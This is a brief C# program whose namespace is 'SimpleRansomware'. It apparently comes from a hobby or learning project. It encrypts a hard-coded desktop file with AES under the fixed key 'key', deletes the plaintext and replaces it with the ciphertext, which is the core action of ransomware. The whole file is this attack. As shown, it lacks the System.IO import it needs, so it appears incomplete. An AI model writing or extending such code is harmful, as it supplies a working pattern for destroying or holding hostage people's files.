using System;
using SharpAESCrypt;

namespace SimpleRansomware
{
    class Program
    {
        static void Main(string[] args)
        {
            string dir = @"C:\Users\vitor\OneDrive\Área de Trabalho\";
            string text_file = dir + "File.txt.txt";
            string encrypted = dir + "encrypted.txt";
            string key = "key";

            SharpAESCrypt.SharpAESCrypt.Encrypt(key, text_file, encrypted);
            File.Delete(text_file);
            File.Move(encrypted, text_file);
        }
    }
}
